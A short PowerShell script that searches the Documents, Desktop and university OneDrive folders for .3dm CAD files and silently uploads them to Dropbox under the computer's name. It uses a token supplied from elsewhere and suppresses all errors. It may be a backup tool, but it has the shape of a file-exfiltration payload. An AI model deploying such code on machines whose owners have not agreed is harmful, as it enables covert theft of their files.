# Dropbox configuration
$accessToken = $db
$localFolders = @(
    "$env:USERPROFILE\Documents",
    "$env:USERPROFILE\Desktop",
    "$env:USERPROFILE\OneDrive - University of Nebraska-Lincoln"
)

# API endpoints
$dropboxCreateFolderUrl = "https://api.dropboxapi.com/2/files/create_folder_v2"
$dropboxUploadUrl = "https://content.dropboxapi.com/2/files/upload"

# Create computer-specific folder
$computerName = $env:COMPUTERNAME
$headers = @{
    "Authorization" = "Bearer $accessToken"
    "Content-Type" = "application/json"
}
$body = @{
    "path" = "/$computerName"
    "autorename" = $true
} | ConvertTo-Json

try {
    Invoke-RestMethod -Uri $dropboxCreateFolderUrl -Method Post -Headers $headers -Body $body | Out-Null
} catch {
    # Folder likely already exists
}

# Upload files
$headers["Content-Type"] = "application/octet-stream"
foreach ($folder in $localFolders) {
    Get-ChildItem -Path $folder -Filter "*.3dm" -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
        $relativePath = $_.FullName.Replace($folder, '').TrimStart('\')
        $dropboxFilePath = "$computerName/$relativePath".Replace('\', '/')
        
        $headers["Dropbox-API-Arg"] = @{
            "path" = "/$dropboxFilePath"
            "mode" = "add"
            "autorename" = $true
            "mute" = $false
        } | ConvertTo-Json -Compress
        
        try {
            $fileBytes = [System.IO.File]::ReadAllBytes($_.FullName)
            $null = Invoke-RestMethod -Uri $dropboxUploadUrl -Method Post -Headers $headers -Body $fileBytes
        } catch {
            # Silent error handling
        }
    }
}

# Keep window open for debugging (remove in production)
Start-Sleep -Seconds 30
